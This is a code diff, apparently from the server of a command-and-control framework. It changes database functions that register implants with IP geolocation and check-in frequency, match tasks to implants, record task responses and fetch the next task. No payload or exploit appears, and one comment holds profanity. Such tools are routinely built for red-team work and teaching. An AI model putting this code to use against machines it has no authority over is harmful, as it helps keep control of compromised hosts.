@@ -18,6 +18,7 @@ def make_implant(ri: RegisterImplant, ip) -> RegisterImplant:
         username = ri.Username,
         ip_addr = ip,
         checkin_frq = 1000,
+        first_seen = func.now(),
         latitude = location[0],
         longitude = location[1])
     print(i)
@@ -65,25 +66,36 @@ def get_implant_by_id(implant_id):
     implant = db.session.query(Implant).filter_by(implant_id=implant_id).first()
     return implant
 
-def get_task_by_id(task_id):
+def get_task_by_ids(task_id, implant_id):
     # Query the Implant table by implant_id
-    implant = db.session.query(Task).filter_by(task_id=task_id).first()
+    implant = db.session.query(Task).filter_by(task_id=task_id).filter_by(implant_id=implant_id).first()
     return implant
 
 def analyze_TaskResponse(tr: TaskResponse):
     if tr is None:
-        return ""
+        return
     
     print(f'[+] TaskReponse:')
     print(f'[+]    * TaskID: {tr.TaskID}')
-    print(f'[+]    * Opcode: {tr.Opcode}')
-    print(f'[+]    * Args: {tr.Args}')
+    print(f'[+]    * ImplantID: {tr.ImplantID}')
+    print(f'[+]    * Response: {tr.Response}')
     
     # Query the Implant table by implant_id
-    task = get_task_by_id(tr.TaskID)
+    task = get_task_by_ids(tr.TaskID, tr.ImplantID)
+    
+    if not tr.HasField("Response"):
+        task.status = STATUS_TASK_FAILED
+    else:
+        task.status = STATUS_TASK_COMPLETE
+        task.task_output = tr.Response # WING HAS FOREWARNED - THIS WILL FUCK YOU UP. TAKE A DEEP BREATH. AND CAST HOWEVER YOU NEED TO. REGARDLES OF THE CASTING SINS YOU COMMIT
+    
     db.session.commit()
 
-    return ""
+
+# Send TaskRequest back or "" (if no tasks)
+def get_next_task(iID):
+   task = db.session.query(Task).filter_by(implant_id=iID).order_by(Task.task_id.desc())
+   return task
 
 def make_dummy_task(ip):
     location = get_location(ip)
